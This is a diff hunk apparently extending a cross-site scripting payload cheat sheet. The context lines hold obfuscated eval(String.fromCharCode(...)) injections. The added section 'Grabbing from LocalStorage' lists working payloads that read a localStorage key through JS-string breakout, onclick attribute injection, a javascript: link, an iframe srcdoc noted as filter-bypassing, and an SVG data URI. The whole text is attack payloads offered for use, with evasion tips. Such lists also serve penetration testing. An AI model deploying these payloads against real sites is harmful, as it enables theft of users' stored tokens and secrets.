@@ -48,3 +48,27 @@ eval(String.fromCharCode(99, 111, 110, 102, 105, 114, 109, 40, 49, 41, 59));
 ');eval(String.fromCharCode(99, 111, 110, 102, 105, 114, 109, 40, 49, 41, 59));//
 
 
+Grabbing from LocalStorage:
+
+JS-string injection (if reflected into a JS string):
+');(function(){var v=localStorage.getItem('MY_KEY');document.body.appendChild(document.createTextNode('LS:'+v));})();//
+
+Attribute-injection (onclick):
+" onclick="document.body.appendChild(document.createTextNode(localStorage.getItem('MY_KEY')))" x="
+
+javascript: href (user click required, low-noise exfil):
+<a href="javascript:alert(localStorage.getItem('MY_KEY'))">show</a>
+
+iframe srcdoc (may bypass some filters):
+<iframe srcdoc="<script>parent.document.body.appendChild(document.createTextNode(localStorage.getItem('MY_KEY')))</script>"></iframe>
+
+SVG with script (data URI):
+<img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg'%3E%3Cscript%3Eparent.document.body.appendChild(parent.document.createTextNode(localStorage.getItem('MY_KEY')))%3C/script%3E%3C/svg%3E">
+
+
+
+
+
+
+
+
